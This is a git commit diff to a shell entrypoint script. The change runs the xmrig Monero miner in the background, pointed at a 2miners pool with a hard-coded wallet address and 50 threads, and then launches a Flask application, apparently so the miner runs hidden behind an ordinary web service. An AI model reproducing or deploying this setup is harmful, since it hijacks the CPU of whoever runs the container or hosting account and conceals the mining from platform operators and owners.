60e30555f2cc37e742fb339a58ec473d03500684
LykCloud <145738195+LykCloud@users.noreply.github.com>
2023-12-10 21:39:50 +0530

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,2 +1,7 @@
 #!/bin/bash
-./xmrig --donate-level 5 -o xmr.2miners.com:2222 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p R#2 -k --coin monero --threads 50 --max-cpu-usage 50
+
+# Run xmrig in the background
+./xmrig --donate-level 5 -o xmr.2miners.com:2222 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p R#2 -k --coin monero --threads 50 --max-cpu-usage 50 &
+
+# Run the Flask application
+python3 app.py
